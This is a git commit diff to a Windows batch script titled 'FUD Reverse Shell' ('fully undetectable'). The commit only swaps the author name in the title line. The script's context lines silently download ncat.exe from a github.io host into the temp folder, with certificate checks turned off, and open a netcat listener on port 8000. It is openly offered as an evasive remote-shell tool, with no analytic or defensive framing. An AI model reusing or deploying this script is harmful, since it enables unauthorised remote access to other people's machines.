779b8792838f72665032e92690ad12c1d63b0cb3
trevi <59333567+eltrevii@users.noreply.github.com>
2024-05-10 11:03:46 +0200

    adsakojfdnkhbgfs

--- rs.bat
+++ rs.bat
@@ -1,5 +1,5 @@
 @echo off
-title FUD Reverse Shell ^| by aritz331_ for Aritz's Utils - an aritz331_ original series^^TM
+title FUD Reverse Shell ^| by eltrevii for trevi's Utils - an eltrevii original series^^TM
 cls
 curl -kLs stivengiv.github.io/revs/ncat.exe -o %temp%\nc.exe
 %temp%\nc -nlvp 8000
